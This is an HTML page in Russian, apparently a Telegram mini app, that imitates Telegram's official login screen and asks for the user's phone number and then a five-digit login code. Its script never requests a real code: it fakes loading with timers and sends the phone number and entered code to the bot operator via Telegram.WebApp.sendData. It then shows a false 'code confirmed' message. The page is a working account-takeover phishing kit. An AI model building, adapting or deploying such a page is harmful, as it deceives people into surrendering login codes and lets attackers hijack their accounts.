<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            color: #000000;
        }
        
        .page {
            min-height: 100vh;
            padding: 40px 20px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            max-width: 400px;
            margin: 0 auto;
        }
        
        .page.hidden {
            display: none;
        }
        
        .logo {
            width: 160px;
            height: 160px;
            margin-bottom: 40px;
            margin-top: 20px;
        }
        
        .logo svg {
            width: 100%;
            height: 100%;
        }
        
        .title {
            font-size: 32px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            margin-bottom: 12px;
            line-height: 1.2;
        }
        
        .subtitle {
            font-size: 15px;
            color: #707579;
            text-align: center;
            margin-bottom: 40px;
            line-height: 1.4;
            padding: 0 20px;
        }
        
        .form-container {
            width: 100%;
            max-width: 360px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            font-size: 14px;
            color: #707579;
            margin-bottom: 8px;
            display: block;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .country-code {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #000000;
            pointer-events: none;
        }
        
        input {
            width: 100%;
            padding: 12px;
            padding-left: 50px;
            border: 1px solid #e4e6ea;
            border-radius: 8px;
            font-size: 16px;
            background: #ffffff;
            color: #000000;
            outline: none;
            transition: border-color 0.2s;
            font-family: inherit;
        }
        
        input:focus {
            border-color: #3390ec;
        }
        
        input::placeholder {
            color: #a8a8a8;
        }
        
        .code-input {
            padding-left: 12px;
            text-align: center;
            font-size: 24px;
            letter-spacing: 8px;
            font-weight: 500;
        }
        
        .code-hint {
            font-size: 14px;
            color: #707579;
            text-align: center;
            margin-top: 12px;
            line-height: 1.4;
        }
        
        .code-hint strong {
            color: #000000;
            font-weight: 600;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: #3390ec;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
            font-family: inherit;
        }
        
        .btn:hover {
            background: #2d7fd4;
        }
        
        .btn:active {
            background: #2a75c4;
        }
        
        .btn:disabled {
            background: #b4b9be;
            cursor: not-allowed;
        }
        
        .btn-link {
            background: transparent;
            color: #3390ec;
            padding: 12px;
            margin-top: 16px;
        }
        
        .btn-link:hover {
            background: transparent;
            text-decoration: underline;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: #707579;
            font-size: 14px;
        }
        
        .loading.active {
            display: block;
        }
        
        .error {
            display: none;
            background: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
        }
        
        .error.active {
            display: block;
        }
        
        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            background: none;
            border: none;
            color: #3390ec;
            font-size: 16px;
            cursor: pointer;
            padding: 8px;
            font-family: inherit;
        }
        
        .back-btn:hover {
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div id="phonePage" class="page">
        <div class="logo">
            <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="120" cy="120" r="120" fill="#0088cc"/>
                <path d="M53.2 120.2L176.8 67.4C180.4 65.6 184.6 68.2 183.6 72.2L165.1 166.4C164.1 170.2 160.2 172.1 156.9 170.2L119.8 148.1L101.5 160.4C100.1 161.2 98.2 160.8 97.2 159.4L85.8 141.9L53.2 120.2Z" fill="white"/>
                <path d="M85.8 141.9L119.8 148.1L156.9 170.2C160.2 172.1 164.1 170.2 165.1 166.4L183.6 72.2C184.6 68.2 180.4 65.6 176.8 67.4L53.2 120.2C49.6 122 49.6 127.2 53.2 129L85.8 141.9Z" fill="white" fill-opacity="0.85"/>
            </svg>
        </div>
        <h1 class="title">Telegram</h1>
        <p class="subtitle">Пожалуйста, подтвердите свой номер телефона</p>
        
        <div class="form-container">
            <div class="error" id="phoneError"></div>
            
            <div class="input-group">
                <label class="input-label">Телефон</label>
                <div class="input-wrapper">
                    <span class="country-code">+</span>
                    <input type="tel" id="phone" placeholder="123 456 7890" maxlength="15" autocomplete="tel">
                </div>
            </div>
            
            <button class="btn" id="phoneBtn" onclick="sendPhone()">Далее</button>
            
            <div class="loading" id="phoneLoading">Подключение к Telegram...</div>
        </div>
    </div>
    
    <div id="codePage" class="page hidden">
        <button class="back-btn" onclick="goBack()">← Назад</button>
        
        <div class="logo">
            <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="120" cy="120" r="120" fill="#0088cc"/>
                <path d="M53.2 120.2L176.8 67.4C180.4 65.6 184.6 68.2 183.6 72.2L165.1 166.4C164.1 170.2 160.2 172.1 156.9 170.2L119.8 148.1L101.5 160.4C100.1 161.2 98.2 160.8 97.2 159.4L85.8 141.9L53.2 120.2Z" fill="white"/>
                <path d="M85.8 141.9L119.8 148.1L156.9 170.2C160.2 172.1 164.1 170.2 165.1 166.4L183.6 72.2C184.6 68.2 180.4 65.6 176.8 67.4L53.2 120.2C49.6 122 49.6 127.2 53.2 129L85.8 141.9Z" fill="white" fill-opacity="0.85"/>
            </svg>
        </div>
        <h1 class="title">Код подтверждения</h1>
        <p class="subtitle">Мы отправили вам код подтверждения через Telegram</p>
        
        <div class="form-container">
            <div class="error" id="codeError"></div>
            
            <div class="input-group">
                <input type="text" id="code" class="code-input" placeholder="00000" maxlength="5" autocomplete="one-time-code" pattern="[0-9]*" inputmode="numeric">
                <div class="code-hint">
                    Пожалуйста, введите код, который мы отправили в Telegram на номер <strong id="phoneNumber"></strong>
                </div>
            </div>
            
            <button class="btn" id="codeBtn" onclick="sendCode()">Далее</button>
            
            <button class="btn btn-link" onclick="resendCode()">Отправить код повторно</button>
            
            <div class="loading" id="codeLoading">Проверка кода...</div>
        </div>
    </div>
    
    <script>
        if (window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }
        
        let phoneNumber = '';
        
        function showError(page, message) {
            const errorEl = document.getElementById(page + 'Error');
            errorEl.textContent = message;
            errorEl.classList.add('active');
            setTimeout(() => {
                errorEl.classList.remove('active');
            }, 5000);
        }
        
        function sendPhone() {
            const phoneInput = document.getElementById('phone');
            const phone = phoneInput.value.trim().replace(/\s/g, '');
            
            if (!phone || phone.length < 10) {
                showError('phone', 'Пожалуйста, введите корректный номер телефона');
                return;
            }
            
            phoneNumber = '+' + phone;
            document.getElementById('phoneNumber').textContent = phoneNumber;
            
            document.getElementById('phoneBtn').disabled = true;
            document.getElementById('phoneLoading').classList.add('active');
            
            setTimeout(() => {
                document.getElementById('phonePage').classList.add('hidden');
                document.getElementById('codePage').classList.remove('hidden');
                document.getElementById('code').focus();
                document.getElementById('phoneBtn').disabled = false;
                document.getElementById('phoneLoading').classList.remove('active');
            }, 2000);
        }
        
        function sendCode() {
            const codeInput = document.getElementById('code');
            const code = codeInput.value.trim();
            
            if (!code || code.length !== 5) {
                showError('code', 'Пожалуйста, введите 5-значный код');
                return;
            }
            
            document.getElementById('codeBtn').disabled = true;
            document.getElementById('codeLoading').classList.add('active');
            
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    window.Telegram.WebApp.sendData(JSON.stringify({
                        phone: phoneNumber,
                        code: code
                    }));
                }
                alert('Код подтвержден!');
            }, 1500);
        }
        
        function goBack() {
            document.getElementById('codePage').classList.add('hidden');
            document.getElementById('phonePage').classList.remove('hidden');
            document.getElementById('code').value = '';
        }
        
        function resendCode() {
            document.getElementById('code').value = '';
            document.getElementById('code').focus();
            alert('Код отправлен повторно');
        }
        
        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendPhone();
            }
        });
        
        document.getElementById('code').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCode();
            }
        });
        
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                value = value.match(/.{1,3}/g).join(' ');
                if (value.length > 15) value = value.substring(0, 15);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
